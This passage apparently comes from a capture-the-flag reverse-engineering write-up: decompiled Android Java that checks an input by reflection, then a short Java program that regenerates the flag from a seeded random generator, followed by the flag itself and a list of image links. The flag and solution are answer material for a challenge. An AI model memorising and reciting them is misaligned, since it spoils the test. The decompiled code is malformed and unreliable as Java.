             Class uClass1 = Class.forName("java.lang.String");
             uClassArray2[i2] = uClass1;
             Object[] objArray = new Object[1];
             Object[] objArray1 = objArray;
             objArray1[0] = i.val$myedit.getText().toString();
             if (uClass.getMethod(str, uClassArray).invoke(null, objArray1).booleanValue()) {
                Toast.makeText(i.val$context, "You Win!!", 1).show();
             }else {
                Toast.makeText(i.val$context, "Wrong! Try again~", 1).show();
             }
             return;
          }catch(java.lang.ClassNotFoundException e9){
             NoClassDefFoundError noClassDefFo = e9;
             noClassDefFo = new NoClassDefFoundError(e9.getMessage());
             throw noClassDefFo;
          }catch(java.lang.IllegalAccessException e9){
          }catch(java.lang.reflect.InvocationTargetException e9){
          }
       label_00ca :
          int i1 = e9;
       }catch(java.lang.ClassNotFoundException e9){
          goto label_00ca ;
       }catch(java.lang.NoSuchMethodException e9){
          goto label_00ca ;
       }catch(java.lang.IllegalAccessException e9){
       }catch(java.lang.reflect.InvocationTargetException e9){
       }
    }
import java.util.Random;

public class GetFlag {
    private static final String CHARACTERS = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    public static void main(String[] args) {
        String result = generateRandomString(4310, 12);
        System.out.println(result);
    }

    public static String generateRandomString(int seed, int length) {
        Random random = new Random(seed);
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            sb.append(CHARACTERS.charAt(random.nextInt(CHARACTERS.length())));
        }
        return sb.toString();
    }
}
//SHCTF{QdUOJ7V7Xruo}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1729139615.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/5-1729139615.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/4-1729139616.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/9-1729139616.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/3-1729139616.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/7-1729139616.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/6-1729139617.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729139617.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/8-1729139617.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/10/0-1729139617.png)